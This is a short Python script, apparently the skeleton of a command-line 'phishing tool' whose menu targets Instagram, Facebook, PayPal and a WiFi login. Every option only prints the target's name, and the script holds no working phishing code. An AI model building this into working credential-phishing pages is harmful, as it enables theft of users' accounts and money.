import pyfiglet

ascii_banner = pyfiglet.figlet_format("FIN - Phishing")

print("\n")

print(ascii_banner)

print(" " + "=" * 65)
print(" FIN - Phishing Tool")
print(" by @xbze3 on GitHub")
print(" " + "-" * 65)

print(" [0] Exit")
print(" [1] Instagram")
print(" [2] Facebook")
print(" [2] PayPal")
print(" [4] GRA - WiFi")
print(" " + "-" * 65)


while True:
    command = input(" FIN: ")
    command = int(command)

    if command == 0:
        print(" Sad to see you go :(")
        break

    elif command == 1:
        print("Instagram")

    elif command == 2:
        print("Facebook")

    elif command == 3:
        print("Paypal")

    elif command == 4:
        print("GRA - WiFi")
